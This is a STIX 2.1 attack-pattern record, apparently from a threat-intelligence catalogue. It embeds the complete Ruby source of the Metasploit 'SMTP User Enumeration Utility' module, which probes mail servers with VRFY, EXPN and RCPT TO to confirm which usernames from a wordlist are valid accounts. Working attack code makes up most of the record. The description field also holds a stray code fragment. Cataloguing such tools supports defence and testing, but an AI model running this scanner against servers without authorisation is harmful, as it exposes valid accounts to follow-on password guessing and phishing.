{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed310905-555d-45a5-a6c4-f816e9495d3c",
    "created": "2024-08-14T16:26:36.101761Z",
    "modified": "2024-08-14T16:26:36.101764Z",
    "name": "SMTP User Enumeration Utility",
    "description": " The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/smtp/smtp_enum.rb",
            "external_id": "smtp_enum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0531"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Smtp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  Aliases = [\n    'auxiliary/scanner/smtp/enum'\n  ]\n\n  def initialize\n    super(\n      'Name'        => 'SMTP User Enumeration Utility',\n      'Description' => %q{\n        The SMTP service has two internal commands that allow the enumeration\n        of users: VRFY (confirming the names of valid users) and EXPN (which\n        reveals the actual address of users aliases and lists of e-mail\n        (mailing lists)). Through the implementation of these SMTP commands can\n        reveal a list of valid users.\n        },\n      'References'  =>\n      [\n        ['URL', 'http://www.ietf.org/rfc/rfc2821.txt'],\n        ['OSVDB', '12551'],\n        ['CVE', '1999-0531']\n      ],\n        'Author'      =>\n      [\n        'Heyder Andrade <heyder[at]alligatorteam.org>',\n        'nebulus'\n      ],\n        'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(25),\n        OptString.new('USER_FILE',\n          [\n            true, 'The file that contains a list of probable users accounts.',\n            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')\n          ]),\n        OptBool.new('UNIXONLY', [ true, 'Skip Microsoft bannered servers when testing unix users', true])\n      ])\n\n    deregister_options('MAILTO','MAILFROM')\n  end\n\n  def smtp_send(data=nil)\n    begin\n      result=''\n      code=0\n      sock.put(\"#{data}\")\n      result=sock.get_once\n      result.chomp! if(result)\n      code = result[0..2].to_i if result\n      return result, code\n    rescue Rex::ConnectionError, Errno::ECONNRESET, ::EOFError\n      return result, code\n    rescue ::Exception => e\n      print_error(\"#{rhost}:#{rport} Error smtp_send: '#{e.class}' '#{e}'\")\n      return nil, 0\n    end\n  end\n\n  def run_host(ip)\n    users_found = {}\n    result = nil # temp for storing result of SMTP request\n    code = 0     # status code parsed from result\n    vrfy = true  # if vrfy allowed\n    expn = true  # if expn allowed\n    rcpt = true  # if rcpt allowed and useful\n    usernames = extract_words(datastore['USER_FILE'])\n\n    cmd = 'HELO' + \" \" + \"localhost\" + \"\\r\\n\"\n    connect\n    result, code = smtp_send(cmd)\n\n    if(not result)\n      print_error(\"#{rhost}:#{rport} Connection but no data...skipping\")\n      return\n    end\n    banner.chomp! if (banner)\n    if(banner =~ /microsoft/i and datastore['UNIXONLY'])\n      print_status(\"#{rhost}:#{rport} Skipping microsoft (#{banner})\")\n      return\n    elsif(banner)\n      print_status(\"#{rhost}:#{rport} Banner: #{banner}\")\n    end\n\n    domain = result.split()[1]\n    domain = 'localhost' if(domain == '' or not domain or domain.downcase == 'hello')\n\n\n    vprint_status(\"#{ip}:#{rport} Domain Name: #{domain}\")\n\n    result, code = smtp_send(\"VRFY root\\r\\n\")\n    vrfy = (code == 250)\n    users_found = do_enum('VRFY', usernames) if (vrfy)\n\n    if(users_found.empty?)\n    # VRFY failed, lets try EXPN\n      result, code = smtp_send(\"EXPN root\\r\\n\")\n      expn = (code == 250)\n      users_found = do_enum('EXPN', usernames) if(expn)\n    end\n\n    if(users_found.empty?)\n    # EXPN/VRFY failed, drop back to RCPT TO\n      result, code = smtp_send(\"MAIL FROM: root\\@#{domain}\\r\\n\")\n      if(code == 250)\n        user = Rex::Text.rand_text_alpha(8)\n        result, code = smtp_send(\"RCPT TO: #{user}\\@#{domain}\\r\\n\")\n        if(code >= 250 and code <= 259)\n          vprint_status(\"#{rhost}:#{rport} RCPT TO: Allowed for random user (#{user})...not reliable? #{code} '#{result}'\")\n          rcpt = false\n        else\n          smtp_send(\"RSET\\r\\n\")\n          users_found = do_rcpt_enum(domain, usernames)\n        end\n      else\n        rcpt = false\n      end\n    end\n\n    if(not vrfy and not expn and not rcpt)\n      print_status(\"#{rhost}:#{rport} could not be enumerated (no EXPN, no VRFY, invalid RCPT)\")\n      return\n    end\n    finish_host(users_found)\n    disconnect\n\n    rescue Rex::ConnectionError, Errno::ECONNRESET, Rex::ConnectionTimeout, EOFError, Errno::ENOPROTOOPT\n    rescue ::Exception => e\n      print_error(\"Error: #{rhost}:#{rport} '#{e.class}' '#{e}'\")\n  end\n\n  def finish_host(users_found)\n    if users_found and not users_found.empty?\n      print_good(\"#{rhost}:#{rport} Users found: #{users_found.sort.join(\", \")}\")\n      report_note(\n        :host => rhost,\n        :port => rport,\n        :type => 'smtp.users',\n        :data => {:users =>  users_found.join(\", \")}\n      )\n    end\n  end\n\n  def kiss_and_make_up(cmd)\n    vprint_status(\"#{rhost}:#{rport} SMTP server annoyed...reconnecting and saying HELO again...\")\n    disconnect\n    connect\n    smtp_send(\"HELO localhost\\r\\n\")\n    result, code = smtp_send(\"#{cmd}\")\n    result.chomp!\n    cmd.chomp!\n    vprint_status(\"#{rhost}:#{rport} - SMTP - Re-trying #{cmd} received #{code} '#{result}'\")\n    return result,code\n  end\n\n  def do_enum(cmd, usernames)\n\n    users = []\n    usernames.each {|user|\n      next if user.downcase == 'root'\n      result, code = smtp_send(\"#{cmd} #{user}\\r\\n\")\n      vprint_status(\"#{rhost}:#{rport} - SMTP - Trying #{cmd} #{user} received #{code} '#{result}'\")\n      result, code = kiss_and_make_up(\"#{cmd} #{user}\\r\\n\") if(code == 0 and result.to_s == '')\n      if(code == 250)\n        vprint_status(\"#{rhost}:#{rport} - Found user: #{user}\")\n        users.push(user)\n      end\n    }\n    return users\n  end\n\n  def do_rcpt_enum(domain, usernames)\n    users = []\n    usernames.each {|user|\n      next if user.downcase == 'root'\n      vprint_status(\"#{rhost}:#{rport} - SMTP - Trying MAIL FROM: root\\@#{domain} / RCPT TO: #{user}...\")\n      result, code = smtp_send(\"MAIL FROM: root\\@#{domain}\\r\\n\")\n      result, code = kiss_and_make_up(\"MAIL FROM: root\\@#{domain}\\r\\n\") if(code == 0 and result.to_s == '')\n\n      if(code == 250)\n        result, code = smtp_send(\"RCPT TO: #{user}\\@#{domain}\\r\\n\")\n        if(code == 0 and result.to_s == '')\n          kiss_and_make_up(\"MAIL FROM: root\\@#{domain}\\r\\n\")\n          result, code = smtp_send(\"RCPT TO: #{user}\\@#{domain}\\r\\n\")\n        end\n\n        if(code == 250)\n          vprint_status(\"#{rhost}:#{rport} - Found user: #{user}\")\n          users.push(user)\n        end\n      else\n        vprint_status(\"#{rhost}:#{rport} MAIL FROM: #{user} NOT allowed during brute...aborting ( '#{code}' '#{result}')\")\n        break\n      end\n      smtp_send(\"RSET\\r\\n\")\n    }\n    return users\n  end\n\n  def extract_words(wordfile)\n    return [] unless wordfile && File.readable?(wordfile)\n\n    begin\n      File.readlines(wordfile, chomp: true)\n    rescue ::StandardError => e\n      elog(e)\n      []\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}